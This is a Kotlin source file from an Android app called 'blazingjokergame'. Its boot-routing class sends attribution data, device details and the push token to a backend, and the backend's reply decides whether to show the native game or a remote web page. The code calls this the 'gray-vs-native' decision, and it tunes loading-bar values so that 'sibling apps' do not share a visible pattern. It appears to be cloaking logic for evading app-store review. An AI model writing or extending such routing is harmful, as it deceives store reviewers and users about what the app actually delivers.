package com.blazingjoker.blazingjokergame.link

import android.app.Application
import android.content.Context
import android.os.Build
import com.blazingjoker.blazingjokergame.link.config.LinkConfig
import com.blazingjoker.blazingjokergame.link.data.Berth
import com.blazingjoker.blazingjokergame.link.data.ChartAnswer
import com.blazingjoker.blazingjokergame.link.data.LastCourse
import com.blazingjoker.blazingjokergame.link.net.CampaignBroker
import com.blazingjoker.blazingjokergame.link.net.ChartFetcher
import com.blazingjoker.blazingjokergame.link.net.LinkAuditor
import com.blazingjoker.blazingjokergame.link.push.HornService
import com.blazingjoker.blazingjokergame.link.store.StowageBox
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.util.Locale

/**
 * The single entry point for the boot decision. `chart(...)` returns a
 * [Berth]; the caller `when`-branches on it and only there decides which
 * Activity to launch. Ad-hoc routing calls from other classes are
 * forbidden — this class is the only place gray-vs-native is decided.
 *
 * Concurrent invocations of `chart(...)` are de-duplicated behind a mutex
 * so a re-entering LoadingActivity (rotation while boot is in progress)
 * cannot fire two chart POSTs.
 */
internal class LinkPilot private constructor(
    val stowage: StowageBox,
    val auditor: LinkAuditor,
    val campaign: CampaignBroker,
    val fetcher: ChartFetcher,
    val horn: HornService,
) {

    private val gate = Mutex()

    // Progress fractions — deliberately off-round so two sibling apps do
    // NOT share the same visual pacing sequence on the loading bar.
    private val pFirstCarrier = 0.24f
    private val pFirstProbe = 0.42f
    private val pFirstAttribution = 0.68f
    private val pFirstVerdict = 0.94f
    private val pReturnAttribution = 0.61f
    private val pReturnVerdict = 0.93f

    private val ambientScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun kickOffAmbient() {
        ambientScope.launch {
            // These do not block routing but must run early so the token
            // and installer signals are ready by the time we POST.
            runCatching { horn.boot() }
            runCatching { campaign.boot() }
        }
    }

    suspend fun chart(onProgress: (Float) -> Unit = {}): Berth = gate.withLock {
        try {
            if (!LinkConfig.credentialsReady) {
                onProgress(1f)
                return@withLock Berth.Native
            }

            // Cold-tap push URL trumps everything.
            stowage.consumePendingUrl()?.let { url ->
                stowage.course = LastCourse.Web
                launchFireAndForget()
                onProgress(1f)
                return@withLock Berth.Web(url = url, fromColdPush = true)
            }

            when (stowage.course) {
                LastCourse.Unset -> decideFresh(onProgress)
                LastCourse.Web -> decideReturningWeb(onProgress)
                LastCourse.Native -> decideReturningNative(onProgress)
            }
        } catch (_: Throwable) {
            onProgress(1f)
            Berth.Native
        }
    }

    private suspend fun decideFresh(onProgress: (Float) -> Unit): Berth {
        if (!auditor.hasCarrier()) return Berth.LostSignal(previouslyOnNative = false)
        onProgress(pFirstCarrier)

        // Boot subsystems in parallel — neither blocks the other.
        awaitBoth(campaign::boot, horn::boot)

        if (!auditor.canRouteOut()) return Berth.LostSignal(previouslyOnNative = false)
        onProgress(pFirstProbe)

        val installBag = campaign.awaitInstall(LinkConfig.FIRST_INSTALL_WAIT_MS)
        onProgress(pFirstAttribution)

        val answer = askChart(installBag)
        onProgress(pFirstVerdict)

        return if (answer.hasDestination) {
            stowage.course = LastCourse.Web
            Berth.Web(answer.url!!, fromColdPush = false)
        } else {
            stowage.course = LastCourse.Native
            Berth.Native
        }
    }

    private suspend fun decideReturningWeb(onProgress: (Float) -> Unit): Berth {
        if (!auditor.hasCarrier()) return Berth.LostSignal(previouslyOnNative = false)

        val cached = stowage.cachedDestination()
        if (cached != null && !stowage.cachedDestinationExpired) {
            onProgress(1f)
            return Berth.Web(cached, fromColdPush = false)
        }

        awaitBoth(campaign::boot, horn::boot)
        if (!auditor.canRouteOut()) {
            return cached?.let { Berth.Web(it, fromColdPush = false) }
                ?: Berth.LostSignal(previouslyOnNative = false)
        }

        val installBag = campaign.awaitInstall(LinkConfig.RETURN_INSTALL_WAIT_MS)
        onProgress(pReturnAttribution)
        val answer = askChart(installBag)
        onProgress(pReturnVerdict)

        if (answer.hasDestination) return Berth.Web(answer.url!!, fromColdPush = false)
        return cached?.let { Berth.Web(it, fromColdPush = false) }
            ?: Berth.LostSignal(previouslyOnNative = false)
    }

    private suspend fun decideReturningNative(onProgress: (Float) -> Unit): Berth {
        if (!auditor.hasCarrier()) {
            onProgress(1f)
            return Berth.Native
        }
        awaitBoth(campaign::boot, horn::boot)
        if (!auditor.canRouteOut()) {
            onProgress(1f)
            return Berth.Native
        }
        val installBag = campaign.awaitInstall(LinkConfig.RETURN_INSTALL_WAIT_MS)
        onProgress(pReturnAttribution)
        val answer = askChart(installBag)
        onProgress(pReturnVerdict)
        if (!answer.hasDestination) return Berth.Native
        stowage.course = LastCourse.Web
        return Berth.Web(answer.url!!, fromColdPush = false)
    }

    private suspend fun askChart(installBag: Map<String, Any?>): ChartAnswer {
        val body = JSONObject()
        installBag.forEach { (k, v) -> body.putOpt(k, v) }
        body.putOpt("af_id", campaign.deviceUid().orEmpty())
        body.putOpt("bundle_id", LinkConfig.APPLICATION_ID)
        body.putOpt("os", "Android")
        body.putOpt("os_version", Build.VERSION.RELEASE)
        body.putOpt("store_id", LinkConfig.STORE_ID)
        body.putOpt("locale", Locale.getDefault().toString().replace('-', '_'))
        body.putOpt("device_model", "${Build.BRAND} ${Build.MODEL}")

        val fcmToken = horn.token
        if (!fcmToken.isNullOrEmpty()) body.put("push_token", fcmToken)
        val firebaseProject = LinkConfig.messagingProject()
        if (firebaseProject.isNotEmpty()) body.put("firebase_project_id", firebaseProject)

        return fetcher.ask(body)
    }

    private fun launchFireAndForget(): Job = ambientScope.launch {
        // Ambient chart refresh so the backend records the cold-tap event.
        runCatching {
            awaitBoth(campaign::boot, horn::boot)
            val installBag = campaign.awaitInstall(LinkConfig.RETURN_INSTALL_WAIT_MS)
            askChart(installBag)
        }
    }

    private suspend fun awaitBoth(a: suspend () -> Unit, b: suspend () -> Unit) {
        val scope = CoroutineScope(Dispatchers.IO)
        val jobs = listOf(
            scope.async { runCatching { a() } },
            scope.async { runCatching { b() } },
        )
        jobs.awaitAll()
    }

    companion object {
        @Volatile
        private var singleton: LinkPilot? = null
        private val lock = Any()

        fun of(context: Context): LinkPilot {
            singleton?.let { return it }
            return synchronized(lock) {
                singleton ?: build(context.applicationContext).also { singleton = it }
            }
        }

        private fun build(ctx: Context): LinkPilot {
            val app = ctx.applicationContext as Application
            val stowage = StowageBox(app)
            val auditor = LinkAuditor(app)
            val campaign = CampaignBroker(app)
            val fetcher = ChartFetcher(stowage)
            val horn = HornService(app)
            return LinkPilot(stowage, auditor, campaign, fetcher, horn)
        }
    }
}
